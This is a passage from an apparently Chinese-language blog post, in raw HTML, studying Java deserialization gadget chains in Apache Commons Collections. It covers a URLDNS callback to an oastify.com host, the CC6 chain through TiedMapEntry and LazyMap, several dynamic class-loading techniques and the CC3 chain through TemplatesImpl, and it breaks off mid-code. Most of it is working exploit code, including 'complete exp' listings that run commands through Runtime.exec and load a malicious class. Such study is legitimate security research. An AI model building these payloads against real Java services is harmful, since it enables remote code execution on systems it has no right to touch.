class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://4in5n1cs407b3ptucinr5fmck3quel2a.oastify.com&quot;</span>);<br>    <span class="hljs-comment">//反射修改hashcode</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">urlClass</span> <span class="hljs-operator">=</span> URL.class;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefield</span> <span class="hljs-operator">=</span> urlClass.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>    hashCodefield.setAccessible(<span class="hljs-literal">true</span>);<br>    hashCodefield.set(url,<span class="hljs-number">1234</span>);<br>    hashMap.put(url,<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//修改回-1</span><br>    hashCodefield.set(url,-<span class="hljs-number">1</span>);<br>    serialize(hashMap);<br>    unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>    oss.writeObject(obj);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>    <span class="hljs-keyword">return</span> ois.readObject();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h2><p>在CC1中我们是使用动态代理的方式进行调用<code>LazyMap</code>的get方法，接下来的CC6中则是使用<code>TideMapEntry</code>的hashcode方法来调用<code>LazyMap</code>的get方法</p><p><img src="/image/cc%E9%93%BE/image-20240425103436008.png" alt="image-20240425103436008"> </p><p>因为后半部分与cc1的后半部分一致，都是通过<code>ChainedTransformer</code>进行递归调用，最后利用<code>invokerTransformer</code>进行反射调用类</p><p>所以代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br></code></pre></td></tr></table></figure><p>首先将lazymap放进<code>TideMapentry</code>中，接下来就是调用TideMapEntry的hashcode方法，直接利用put就可以调用到hashcode方法（跟URLdns差不多）</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs processing">TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new </span><span class="hljs-class title_">TiedMapEntry</span>(lazymap,<span class="hljs-number">123</span>);<br><span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; map2 = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br>map2.<span class="hljs-property">put</span>(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br></code></pre></td></tr></table></figure><p>跟进put后如下</p><p><img src="/image/cc%E9%93%BE/image-20240425105133988.png" alt="image-20240425105133988"> </p><p><img src="/image/cc%E9%93%BE/image-20240425105210906.png" alt="image-20240425105210906"> </p><p>完整代码如下</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>, Class[].<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br>ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>HashMap <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-built_in">Map</span> lazymap = LazyMap.decorate(<span class="hljs-keyword">map</span>, chainedTransformer);<br><br>TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazymap,<span class="hljs-number">123</span>);<br><br>HashMap&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; map2 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>map2.put(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br><br></code></pre></td></tr></table></figure><h3 id="解决put时执行问题"><a href="#解决put时执行问题" class="headerlink" title="解决put时执行问题"></a>解决put时执行问题</h3><p>在put时就会执行命令，这并不是我们需要的，参考URLDNS的方法，我们可以将LazyMap的<code>chainedTransformer</code>改为其他的无用<code>Transformer</code>，代码如下</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dart">HashMap map = <span class="hljs-keyword">new</span> HashMap();<br><span class="hljs-comment">//先给lazymap一个无用的Transformer</span><br><span class="hljs-built_in">Map</span> lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>));<br><br>TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazymap,<span class="hljs-number">123</span>);<br><br>HashMap&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; map2 = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>map2.put(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br><br><span class="hljs-comment">//解决put问题，将无用的Transformer修改为chainedTransformer</span><br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Map</span>&gt; lazymapClass = lazymap.getClass();<br>Field factoryField = lazymapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>factoryField.setAccessible(<span class="hljs-keyword">true</span>);<br>factoryField.<span class="hljs-keyword">set</span>(lazymap,chainedTransformer);<br></code></pre></td></tr></table></figure><p>可是这样又会出现一个新问题，在反序列化中不会去触发调用链，原因是我们在给lazymap一个无用的<code>Transformer</code>后，put仍旧会将key放进<code>lazymap</code>中，导致在反序列化时无法触发调用链</p><p>所以我们需要在put之后将lazymap中的key清除，再将值改为<code>chainedTransformer</code></p><p>完整exp如下</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs processing">Transformer[] transformers = <span class="hljs-keyword">new </span><span class="hljs-class title_">Transformer</span>[]&#123;<br>              <span class="hljs-keyword">new </span><span class="hljs-class title_">ConstantTransformer</span>(Runtime.<span class="hljs-property">class</span>),<br>              <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-property">class</span>, Class[].<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-property">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>              <span class="hljs-keyword">new </span><span class="hljs-class title_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">Class</span>[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-property">class</span>&#125;, <span class="hljs-keyword">new </span><span class="hljs-class title_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>      &#125;;<br>      ChainedTransformer chainedTransformer = <span class="hljs-keyword">new </span><span class="hljs-class title_">ChainedTransformer</span>(transformers);<br><br>      <span class="hljs-built_in">HashMap</span> <span class="hljs-built_in">map</span> = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>();<br>      <span class="hljs-comment">//先给lazymap一个无用的Transformer</span><br>      Map lazymap = LazyMap.<span class="hljs-property">decorate</span>(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">new </span><span class="hljs-class title_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>      TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new </span><span class="hljs-class title_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>      <span class="hljs-built_in">HashMap</span>&lt;<span class="hljs-built_in">Object</span>, <span class="hljs-built_in">Object</span>&gt; map2 = <span class="hljs-keyword">new </span><span class="hljs-class title_">HashMap</span>&lt;&gt;();<br>      map2.<span class="hljs-property">put</span>(tiedMapEntry,<span class="hljs-string">&quot;123&quot;</span>);<br>      lazymap.<span class="hljs-property">remove</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>      <span class="hljs-comment">//解决put问题，将无用的Transformer修改为chainedTransformer</span><br>      Class lazymapClass = lazymap.<span class="hljs-property">getClass</span>();<br>      Field factoryField = lazymapClass.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;factory&quot;</span>);<br>      factoryField.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);<br>      factoryField.<span class="hljs-property">set</span>(lazymap,chainedTransformer);<br><br>      <span class="hljs-comment">//进行序列化和反序列化</span><br>      serialize.<span class="hljs-property">serialize</span>(map2);<br>      unserialze.<span class="hljs-property">unserialize</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><hr><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>准备好一个恶意类保存起来，使用URLClassLoader进行类加载</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-type">URLClassLoader</span> urlClassLoader <span class="hljs-operator">=</span> new <span class="hljs-type">URLClassLoader</span>(new <span class="hljs-type">URL</span>[]&#123;new    <span class="hljs-type">URL</span>(<span class="hljs-string">&quot;file:///C:<span class="hljs-subst">\\</span>Users<span class="hljs-subst">\\</span>40148<span class="hljs-subst">\\</span>Desktop<span class="hljs-subst">\\</span>笔记<span class="hljs-subst">\\</span>CC链<span class="hljs-subst">\\</span>&quot;</span>)&#125;);<br>    <span class="hljs-type">Class</span>&lt;?&gt; calc <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;calc&quot;</span>);<br>    calc.newInstance();<br><br></code></pre></td></tr></table></figure><p>http协议进行类加载</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cos">URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]&#123;<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://localhost:8000/&quot;</span>)&#125;)<span class="hljs-comment">;</span><br>        <span class="hljs-keyword">Class</span>&lt;?&gt; calc = urlClassLoader.loadClass(<span class="hljs-string">&quot;calc&quot;</span>)<span class="hljs-comment">;</span><br>        calc.newInstance()<span class="hljs-comment">;</span><br><br></code></pre></td></tr></table></figure><h4 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader.defineClass"></a>ClassLoader.defineClass</h4><p>这个方法时利用字节码进行加载，不要求目标机出网</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">Method defineClass = ClassLoader.<span class="hljs-keyword">class</span>.<span class="hljs-built_in">getDeclaredMethod</span>(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>,<span class="hljs-type">byte</span>[].<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>, <span class="hljs-type">int</span>.<span class="hljs-keyword">class</span>);<br>defineClass.<span class="hljs-built_in">setAccessible</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] b = Files.<span class="hljs-built_in">readAllBytes</span>(Paths.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br>ClassLoader systemClassLoader = ClassLoader.<span class="hljs-built_in">getSystemClassLoader</span>();<br>Class calc = (Class) defineClass.<span class="hljs-built_in">invoke</span>(systemClassLoader, <span class="hljs-string">&quot;calc&quot;</span>, b, <span class="hljs-number">0</span>, b.length);<br>calc.<span class="hljs-built_in">newInstance</span>();<br></code></pre></td></tr></table></figure><h4 id="Unsafe-defineClass"><a href="#Unsafe-defineClass" class="headerlink" title="Unsafe.defineClass"></a>Unsafe.defineClass</h4><p>Unsafe对象跟runtime一样是单例模式，所以必须通过获取<code>theUnsafe</code>对象来获得</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-title class_">Class</span><span class="hljs-operator">&lt;</span><span class="hljs-title class_">Unsafe</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">unsafeClass</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Unsafe</span>.<span class="hljs-property">class</span>;<br><span class="hljs-title class_">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafeClass</span>.<span class="hljs-property">getDeclaredField</span>(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br><span class="hljs-variable">unsafeField</span>.<span class="hljs-property">setAccessible</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-title class_">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (<span class="hljs-title class_">Unsafe</span>) <span class="hljs-variable">unsafeField</span>.<span class="hljs-property">get</span>(<span class="hljs-literal">null</span>);<br><span class="hljs-variable">byte</span>[] <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">Files</span>.<span class="hljs-property">readAllBytes</span>(<span class="hljs-title class_">Paths</span>.<span class="hljs-property">get</span>(<span class="hljs-string">&quot;C:<span class="hljs-char escape_">\\</span>Users<span class="hljs-char escape_">\\</span>40148<span class="hljs-char escape_">\\</span>Desktop<span class="hljs-char escape_">\\</span>笔记<span class="hljs-char escape_">\\</span>CC链<span class="hljs-char escape_">\\</span>calc.class&quot;</span>));<br><span class="hljs-title class_">ClassLoader</span> <span class="hljs-variable">systemClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">ClassLoader</span>.<span class="hljs-property">getSystemClassLoader</span>();<br><span class="hljs-title class_">Class</span><span class="hljs-operator">&lt;</span>?<span class="hljs-operator">&gt;</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> <span class="hljs-variable">unsafe</span>.<span class="hljs-property">defineClass</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-variable">b</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">b</span>.<span class="hljs-property">length</span>, <span class="hljs-variable">systemClassLoader</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-variable">calc</span>.<span class="hljs-property">newInstance</span>();<br></code></pre></td></tr></table></figure><hr><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="寻找危险函数defineClass"><a href="#寻找危险函数defineClass" class="headerlink" title="寻找危险函数defineClass"></a>寻找危险函数defineClass</h4><p>CC3这里利用的是动态类加载中的<code>ClassLoader.defineClass</code>这个方式进行动态类加载</p><p>我们要进行利用链构造需要找到一个调用<code>ClassLoader.defineClass</code>并且不是<code>protected</code>的地方</p><p>结果在一个<code>TemplatesImpl.TransletClassLoader </code>下找到</p><p><img src="/image/cc%E9%93%BE/image-20240429102128960.png" alt="image-20240429102128960"> </p><p>因为这个<code>defineClass</code>是define，所以在包内还有一个地方调用它</p><p><img src="/image/cc%E9%93%BE/image-20240429102830353.png" alt="image-20240429102830353"> </p><p>继续寻找调用的地方，最终找到一个有进行实例化的函数<code>getTransletInstance</code></p><p><img src="/image/cc%E9%93%BE/image-20240429104722571.png" alt="image-20240429104722571"> </p><p>虽然仍然是 <code>private</code>但是继续寻找用法可以看到有一个<code>public</code>的<code>newTransformer</code></p><p><img src="/image/cc%E9%93%BE/image-20240429105234451.png" alt="image-20240429105234451"> </p><p>接下来我们需要看看<code>_class[_transletIndex]</code>的赋值位置,它的赋值位置在<code>defineTransletClasses</code>中<img src="/image/cc%E9%93%BE/image-20240429105627776.png" alt="image-20240429105627776"> </p><p>回到<code>getTransletInstance</code>中，查看我们构造TransletInstance对象需要的参数</p><p>如下图，需要对<code>_name</code>赋值，使其不会返回，而<code>_class</code>参数则需要为空，因为我们需要调用<code>defineTransletClasses</code>对<code>_class[_transletIndex]</code>进行赋值</p><p><img src="/image/cc%E9%93%BE/image-20240429111508203.png" alt="image-20240429111508203"> </p><p>接着就是loader中的<code>_bytecodes</code>和<code>_tfactory</code></p><p><img src="/image/cc%E9%93%BE/image-20240429112325746.png" alt="image-20240429112325746">  </p><p><code>_tfactory</code>在reaObject中默认赋值，所以可以忽略</p><p>但是因为调试时没有经过反序列化，所以还是先赋值</p><p>此时会出现一个空指针错误</p><p><img src="/image/cc%E9%93%BE/image-20240429122136433.png" alt="image-20240429122136433"> </p><p>调试后发现问题出现在下面</p><p><img src="/image/cc%E9%93%BE/image-20240429122318792.png" alt="image-20240429122318792">  </p><p>这里需要使得<code>_transletIndex</code>&gt;0,才不会出现异常，所以我们需要使得if成立，进行赋值操作，if成立的条件是父类等于一个常量，我们只需要查看常量，将恶意类继承到常量类即可</p><p><img src="/image/cc%E9%93%BE/image-20240429122458498.png" alt="image-20240429122458498"> </p><p><img src="/image/cc%E9%93%BE/image-20240429122803005.png" alt="image-20240429122803005"> </p><p>重新编译恶意类即可</p><h4 id="CC3完整exp如下"><a href="#CC3完整exp如下" class="headerlink" title="CC3完整exp如下"></a>CC3完整exp如下</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; tClass = templates.getClass();<br>        <span class="hljs-comment">//反射为name赋值</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;asd&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\40148\\Desktop\\笔记\\CC链\\calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] code=&#123;bytes&#125;;<br>        bytecodesField.set(templates,code);<br>        <span class="hljs-comment">//虽然不需要赋值，但是我们在调试时没有进行反序列化，不会调用readobject</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        templates.newTransformer();</span><br><br>        <span class="hljs-comment">//使用chainedTransformer调用</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 